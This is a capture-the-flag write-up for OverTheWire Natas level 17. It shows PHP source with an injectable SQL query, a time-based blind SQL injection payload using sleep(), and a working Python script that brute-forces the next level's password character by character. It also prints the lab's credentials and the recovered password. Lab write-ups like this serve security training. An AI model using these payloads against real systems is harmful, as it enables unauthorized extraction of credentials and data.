# Writeup level 17
In this challenge we can ask for a username and check it's existence. However we won't get a result this time. Luckily this code is vulnerabel to **SQL-Injection** and SQL has some nice functions that we can use to get a result.

**Source Code**  
```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
}
```

**Exploit**  
Okay since we won't get a result in form of a text, we kind of have to try to figure something out with SQL. Like I said before SQL has some nice functions that can help us. For instance we can use something a function to delay the response when we guessed the correct character of the password. In this case I am going to use my older exploit from level 15 and just modify the SQL-Injection part.  
**SQL-Injection**:  
```sql
SELECT * from users where username="natas18" AND password LIKE BINARY {ourpw}% AND sleep(2);-- -
```

```python
import requests
import string

symbols = string.printable[:62]
password = ""
char = 0

while char != 62:
	temp_pw = password
	password += symbols[char]
	# SQL: SELECT * from users where username="natas18" AND password LIKE BINARY {ourpw}% AND sleep(2);-- -"
	sql_injection = f"\" AND password LIKE BINARY \"{password}%\" AND sleep(2);-- -"
	postdata = {'username': 'natas18' + sql_injection}
	r = requests.post('http://natas17.natas.labs.overthewire.org/?debug=true', data=postdata, auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))

	if(r.elapsed.total_seconds() >= 2):
		char = 0
	else:	
		char += 1
		password = temp_pw
	
	print(f"Password is: {password}")

# xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

The password is:  
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
